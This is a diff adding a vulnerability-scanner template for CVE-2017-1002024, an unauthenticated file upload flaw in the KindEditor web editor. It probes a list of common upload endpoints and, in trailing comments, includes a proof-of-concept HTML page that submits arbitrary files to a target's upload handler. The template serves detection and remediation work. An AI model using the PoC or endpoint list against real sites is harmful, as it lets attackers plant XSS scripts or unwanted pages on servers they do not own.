@@ -1,0 +1,96 @@
+id: kindeditor-fileupload
+info:
+  name: kindeditor 文件上传
+  author: leadlife
+  severity: medium
+  description: kindeditor <= 4.1.5 文件上传漏洞, 由于上传文件属性的限制，虽不能上传木马，但是危害也是极大，攻击者可通过该漏洞被植入 xss 脚本、插入色情广告页面。
+  reference: 
+    - demo
+  classification:
+    cve-id: CVE-2017-1002024
+  metadata:
+    verified: true
+    fofa-query: demo
+    repair: 限制 htm,html 后缀，避免攻击者上传该类可执行 xss 脚本
+  tags: kindeditor,fileupload
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/kindeditor/asp/upload_json.asp?dir=file"
+      - "{{BaseURL}}/kindeditor/asp.net/upload_json.ashx?dir=file"
+      - "{{BaseURL}}/kindeditor/jsp/upload_json.jsp?dir=file"
+      - "{{BaseURL}}/kindeditor/php/upload_json.php?dir=file"
+      - "{{BaseURL}}/KindEditor1/asp/upload_json.asp?dir=file"
+      - "{{BaseURL}}/editor/asp/upload_json.asp?dir=file"
+      - "{{BaseURL}}/editor/asp.net/upload_json.ashx?dir=file"
+      - "{{BaseURL}}/editor/jsp/upload_json.jsp?dir=file"
+      - "{{BaseURL}}/editor/php/upload_json.php?dir=file"
+    
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'请选择文件','message','error')
+        condition: and
+
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'message','error','\u8BF7')
+        condition: and
+
+# use poc.html
+
+# <html><head>
+
+# <title>Uploader</title>
+
+# <script src="http://ip/kindeditor/kindeditor.js"></script>
+
+# <script>
+
+# KindEditor.ready(function(K) {
+
+# var uploadbutton = K.uploadbutton({
+
+# button : K('#uploadButton')[0],
+
+# fieldName : 'imgFile',
+
+# url : 'http://ip/kindeditor/asp.net/upload_json.ashx?dir=file',
+
+# afterUpload : function(data) {
+
+# if (data.error === 0) {
+
+# var url = K.formatUrl(data.url, 'absolute');
+
+# K('#url').val(url);}
+
+# },
+
+# });
+
+# uploadbutton.fileBox.change(function(e) {
+
+# uploadbutton.submit();
+
+# });
+
+# });
+
+# </script></head><body>
+
+# <div class="upload">
+
+# <input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
+
+# <input type="button" id="uploadButton" value="Upload" />
+
+# </div>
+
+# </body>
+
+# </html>
